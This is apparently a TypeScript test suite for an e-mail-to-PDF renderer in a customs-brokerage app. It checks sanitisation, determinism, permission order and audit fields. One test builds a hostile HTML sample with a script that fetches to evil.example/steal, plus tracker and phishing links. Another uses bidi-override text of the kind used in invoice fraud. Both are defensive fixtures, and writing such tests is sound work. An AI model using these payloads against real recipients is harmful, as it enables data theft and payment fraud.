/**
 * CEO-ALIGNMENT WP1-D — « Ordre de transit / instruction client », and the
 * customer's instructing e-mail filed on the dossier with its provenance.
 * ---------------------------------------------------------------------------
 * The renderer is exercised for real (bytes in, bytes out). The ingestion
 * boundary is asserted structurally on comment-stripped source: the order of
 * the authority checks, what is written, and what is NOT (no verification, no
 * address or subject in the audit row).
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, it, expect } from "vitest";
import {
  MAX_BODY_CHARS,
  MAX_BODY_LINES,
  MAX_FIELD_CHARS,
  bodyFor,
  capField,
  htmlToText,
  normalizeText,
  renderInstructionMessage,
  utcStamp,
  wrapLine,
  type MessageRenderInput,
} from "@/lib/ec/ingest/message-render";
import { documentDoctrine } from "@/lib/documents/doctrine";
import { textWidth } from "@/lib/reports/pdf";
import { AuditActions } from "@/lib/audit/events";
import { validateAuditEvent } from "@/lib/audit/validate";

const read = (p: string) => readFileSync(fileURLToPath(new URL(`../${p}`, import.meta.url)), "utf8");
const code = (p: string) =>
  read(p).replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
const sql = (p: string) => read(p).replace(/--[^\n]*/g, "");
const latin1 = (b: Uint8Array) => Buffer.from(b).toString("latin1");

const RAW = "a".repeat(64);
const input = (over: Partial<MessageRenderInput> = {}): MessageRenderInput => ({
  fileNumber: "EFT-IMP-2026-00042",
  fromAddress: "achat@client.sn",
  fromName: "Service Achats",
  to: ["ops@effitrans.com"],
  cc: ["direction@effitrans.com"],
  subject: "Dédouanement conteneur MSKU1234567",
  receivedAt: "2026-10-21T09:14:33Z",
  messageIdHeader: "<abc123@client.sn>",
  rawSha256: RAW,
  textBody: "Bonjour,\nMerci de prendre en charge le dédouanement.\nCordialement",
  htmlBody: null,
  attachments: [{ filename: "facture.pdf", sizeBytes: 52_000 }],
  ...over,
});

describe("WP1-D — the rendition of a captured message", () => {
  it("is a PDF carrying the envelope, the original's SHA-256 and the text", () => {
    const pdf = latin1(renderInstructionMessage(input()));
    expect(pdf.startsWith("%PDF-")).toBe(true);
    expect(pdf).toContain("EFT-IMP-2026-00042");
    expect(pdf).toContain("achat@client.sn");
    expect(pdf).toContain(RAW);
    expect(pdf).toContain("MSKU1234567");
    expect(pdf).toContain("facture.pdf");
    expect(pdf).toContain("Merci de prendre en charge");
  });

  it("is deterministic: the same message gives the same bytes (no clock, no randomness)", () => {
    const a = renderInstructionMessage(input());
    const b = renderInstructionMessage(input());
    expect(Buffer.compare(Buffer.from(a), Buffer.from(b))).toBe(0);
    expect(code("lib/ec/ingest/message-render.ts")).not.toMatch(/Date\.now\(|new Date\(\)|Math\.random|randomUUID/);
  });

  it("renders HTML as TEXT: scripts, styles and remote resources never survive", () => {
    const hostile =
      '<html><head><title>x</title><style>body{background:url(https://evil.example/bg.png)}</style></head>' +
      '<body><p>Bonjour&nbsp;&eacute;quipe</p><script>fetch("https://evil.example/steal")</script>' +
      '<img src="https://tracker.example/pixel.gif"><a href="https://phish.example">lien</a></body></html>';
    const text = htmlToText(hostile);
    expect(text).toContain("Bonjour équipe");
    expect(text).toContain("lien");
    expect(text).not.toMatch(/evil\.example|tracker\.example|phish\.example|<|fetch\(/);
    const pdf = latin1(renderInstructionMessage(input({ textBody: null, htmlBody: hostile })));
    expect(pdf).not.toMatch(/evil\.example|tracker\.example|phish\.example/);
    expect(pdf).toContain("aucun contenu distant");
  });

  it("can fetch nothing: the renderer imports only the PDF engine and its own types", () => {
    const src = code("lib/ec/ingest/message-render.ts");
    const imports = src.match(/^import .* from "([^"]+)";$/gm) ?? [];
    expect(imports).toEqual(['import { PdfDoc, textWidth, type RGB } from "@/lib/reports/pdf";']);
    expect(src).not.toMatch(/\bfetch\(|XMLHttpRequest|node:http|node:https|require\(/);
  });

  it("states a truncation instead of applying it silently", () => {
    const long = "mot ".repeat(MAX_BODY_CHARS);
    const b = bodyFor({ textBody: long, htmlBody: null });
    expect(b.truncated).toBe(true);
    expect(b.text.length).toBe(MAX_BODY_CHARS);
    const pdf = latin1(renderInstructionMessage(input({ textBody: long })));
    expect(pdf).toContain("Texte tronqu");
  });

  it("says when the message has no text rather than printing an empty page", () => {
    const pdf = latin1(renderInstructionMessage(input({ textBody: null, htmlBody: null })));
    expect(pdf).toContain("ne contient pas de texte");
  });

  it("wraps long lines and hard-breaks a token wider than the page", () => {
    const lines = wrapLine("x".repeat(400), 200, 10);
    expect(lines.length).toBeGreaterThan(1);
    expect(lines.join("")).toBe("x".repeat(400));
    expect(wrapLine("", 200, 10)).toEqual([""]);
  });

  it("normalises line endings and removes control characters", () => {
    expect(normalizeText("a\r\nb\u0007c\n\n\n\nd")).toBe("a\nbc\n\nd");
    expect(utcStamp("2026-10-21T09:14:33Z")).toBe("2026-10-21 09:14 UTC");
  });
});

describe("WP1-D — the document type (migration #159)", () => {
  it("is optional and non-expiring: no new mandatory-document rule, no validity", () => {
    const m = sql("supabase/migrations/20261021000003_document_type_ordre_de_transit.sql");
    expect(m).toMatch(/'ORDRE_DE_TRANSIT',\s*'Ordre de transit \/ instruction client'/);
    expect(m).toMatch(/'commercial',\s*false,\s*'\{\}'/);
    expect(m).toMatch(/on conflict \(code\) do nothing/);
  });

  it("is external evidence and NOT client-safe (a rendition carries internal recipients)", () => {
    const d = documentDoctrine("ORDRE_DE_TRANSIT");
    expect(d?.category).toBe("EXTERNAL_EVIDENCE");
    expect(d?.clientSafe).toBe(false);
    expect(d?.earliestStage).toBe("open");
  });
});

describe("WP1-D — the ingestion boundary", () => {
  const actions = code("lib/ec/ingest/message-actions.ts");
  const fn = actions.slice(actions.indexOf("export async function ingestMessageToDossier"));

  it("composes the same two authorities as attachment ingestion, in order, before any read", () => {
    const order = [
      'hasPermission(permissions, "communication:inbound:read")',
      'hasPermission(permissions, "document:create")',
      "await messageProvenanceStored()",
      "isFileVisible(user.id, user.tenantId, input.fileId)",
      "loadInboundMessage(user.tenantId, input.messageId)",
    ].map((s) => fn.indexOf(s));
    for (const i of order) expect(i).toBeGreaterThan(-1);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
  });

  it("files an UPLOADED document of type ORDRE_DE_TRANSIT with message provenance — never a verified one", () => {
    const svc = code("lib/ec/ingest/message-service.ts");
    const ingest = svc.slice(svc.indexOf("export async function ingestMessage("));
    expect(svc).toContain('export const INSTRUCTION_TYPE_CODE = "ORDRE_DE_TRANSIT";');
    expect(ingest).toContain("type_code: INSTRUCTION_TYPE_CODE,");
    expect(ingest).toContain('status: "UPLOADED",');
    expect(ingest).toContain("source_message_id: message.id,");
    expect(ingest).not.toMatch(/VERIFIED|APPROVED|reviewed_by/);
    // Only a CAPTURED message can be filed, never a quarantined one.
    expect(svc).toContain('.eq("capture_status", "RECEIVED")');
    // An unreadable body is a refusal, not an empty rendition.
    expect(ingest).toContain('return { ok: false, error: "body_unreadable" };');
  });

  it("never modifies the captured message", () => {
    const svc = code("lib/ec/ingest/message-service.ts");
    expect(svc).not.toMatch(/from\("ec_inbound_message"\)[\s\S]{0,200}\.(update|delete|upsert)\(/);
  });

  it("audits once, with hashes and ids only — no address, no subject", () => {
    const audit = fn.slice(fn.indexOf("await writeAudit({"), fn.indexOf("revalidatePath("));
    expect(audit).toContain("action: AuditActions.EC_MESSAGE_INGESTED,");
    expect(audit).toContain("raw_sha256: outcome.rawSha256,");
    expect(audit).not.toMatch(/subject|from_address|fromAddress|to_addresses/);
    expect(() =>
      validateAuditEvent({
        action: AuditActions.EC_MESSAGE_INGESTED,
        actorId: "22222222-2222-4222-8222-222222222222",
        entityId: "11111111-1111-4111-8111-111111111111",
      }),
    ).not.toThrow();
  });

  it("idempotency is the database's: one document per message (partial UNIQUE index)", () => {
    const m = sql("supabase/migrations/20261021000004_document_source_message.sql");
    expect(m).toMatch(/create unique index if not exists uq_document_source_message\s+on public\.document \(source_message_id\)\s+where source_message_id is not null/);
    expect(m).toMatch(/references public\.ec_inbound_message \(id\)/);
  });

  it("the control is drawn only for holders of both authorities, once #160 is applied", () => {
    const page = code("app/mail/inbox/[id]/page.tsx");
    expect(page).toContain("const canFileMessage = canIngest && (await messageFilingAvailable());");
    expect(page).toContain("{canFileMessage ? (");
  });
});

describe("WP1-D — AUDIT-HARDENING-01: bounded, linear rendering (F-2) and no dossier disclosure (F-5)", () => {
  // The wp1d-1 implementation, verbatim. The linear one must produce the same lines.
  function wrapLineReference(line: string, maxWidth: number, size: number): string[] {
    if (line === "") return [""];
    const out: string[] = [];
    let current = "";
    for (const word of line.split(/(\s+)/)) {
      if (word === "") continue;
      const candidate = current + word;
      if (textWidth(candidate, size) <= maxWidth) {
        current = candidate;
        continue;
      }
      if (current.trim() !== "") out.push(current.trimEnd());
      let rest = word.trimStart();
      while (textWidth(rest, size) > maxWidth && rest.length > 1) {
        let cut = rest.length;
        while (cut > 1 && textWidth(rest.slice(0, cut), size) > maxWidth) cut--;
        out.push(rest.slice(0, cut));
        rest = rest.slice(cut);
      }
      current = rest;
    }
    if (current.trim() !== "" || out.length === 0) out.push(current.trimEnd());
    return out;
  }
  const pages = (b: Uint8Array) => Number(/\/Type \/Pages \/Kids \[[^\]]*\] \/Count (\d+)/.exec(latin1(b))?.[1]);

  it("wraps exactly as the previous version did, on seeded random lines", () => {
    let seed = 0x5eed;
    const rnd = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
    const alphabet = ["a", "b", "i", "l", "W", "M", "@", "é", "€", " ", "  ", " ", "‮", "🙂", "-", "/", "日"];
    for (let n = 0; n < 200; n++) {
      const words: string[] = [];
      const count = 1 + Math.floor(rnd() * 25);
      for (let w = 0; w < count; w++) {
        const len = rnd() < 0.15 ? 30 + Math.floor(rnd() * 60) : 1 + Math.floor(rnd() * 12);
        let word = "";
        for (let k = 0; k < len; k++) word += alphabet[Math.floor(rnd() * alphabet.length)];
        words.push(word);
      }
      const line = words.join(rnd() < 0.5 ? " " : "");
      for (const [width, size] of [[60, 10], [200, 9], [499.28, 10], [499.28, 7.5], [30, 13]] as const) {
        expect(wrapLine(line, width, size)).toEqual(wrapLineReference(line, width, size));
      }
    }
  });

  it("hard-breaks a 20 000-character token in linear time, every piece within the line", () => {
    const token = "A".repeat(MAX_BODY_CHARS);
    const t0 = performance.now();
    const lines = wrapLine(token, 499.28, 10);
    expect(performance.now() - t0).toBeLessThan(1000); // the cubic version took ~40 s
    expect(lines.join("")).toBe(token);
    for (const l of lines) expect(textWidth(l, 10)).toBeLessThanOrEqual(499.28);
    const t1 = performance.now();
    wrapLine("x".repeat(1_000_000), 499.28, 10);
    expect(performance.now() - t1).toBeLessThan(2000);
  });

  it("bounds the PDF whatever the message: pathological bodies and hostile header values", () => {
    const lines = renderInstructionMessage(input({ textBody: "a\n\n".repeat(7_000) }));
    expect(latin1(lines)).toContain("Texte tronqu");
    expect(pages(lines)).toBeLessThanOrEqual(Math.ceil(MAX_BODY_LINES / 50) + 2);
    const subject = renderInstructionMessage(input({ subject: "S".repeat(1_000_000) }));
    expect(pages(subject)).toBe(1);
    expect(latin1(subject)).toContain("[tronqu");
    const recipients = renderInstructionMessage(input({ to: Array.from({ length: 10_000 }, (_, i) => `u${i}@x.example`) }));
    expect(pages(recipients)).toBe(1);
    expect(capField("x".repeat(MAX_FIELD_CHARS))).toBe("x".repeat(MAX_FIELD_CHARS));
    expect(capField("x".repeat(MAX_FIELD_CHARS + 1))).toBe(`${"x".repeat(MAX_FIELD_CHARS)} … [tronqué]`);
  });

  it("renders URLs, base64-like strings, non-Latin text and bidi controls deterministically, as visible marks", () => {
    const b64 = Array.from({ length: MAX_BODY_CHARS }, (_, i) =>
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[(i * 7919) % 64]).join("");
    for (const body of [
      b64,
      "https://x.example/" + "a/b?c=d&e=".repeat(2_000),
      "Payez ‮ecnerefer‬ 🙂 ".repeat(800),
      "日本語のテキスト ".repeat(500),
    ]) {
      const a = renderInstructionMessage(input({ textBody: body }));
      const b = renderInstructionMessage(input({ textBody: body }));
      expect(Buffer.compare(Buffer.from(a), Buffer.from(b))).toBe(0);
    }
    // A direction override cannot reorder the evidence: it prints as a visible mark.
    const pdf = latin1(renderInstructionMessage(input({ textBody: "Payez ‮ecnerefer‬ ici" })));
    expect(pdf).toContain("Payez ?ecnerefer? ici");
  });

  it("F-5: the inbox lookup names the dossier only to someone who can see it", () => {
    const actions = code("lib/ec/ingest/message-actions.ts");
    const fn = actions.slice(
      actions.indexOf("export async function lookupIngestedMessage"),
      actions.indexOf("export async function messageFilingAvailable"),
    );
    expect(fn).toContain("isFileVisible(user.id, user.tenantId, filed.fileId)");
    expect(fn).toContain("fileId: visible ? filed.fileId : null");
    expect(fn).not.toMatch(/return findIngestedMessageDocument\(/);
    const ui = code("components/ec/message-ingest.tsx");
    expect(ui).toContain("done.fileId === null");
  });
});
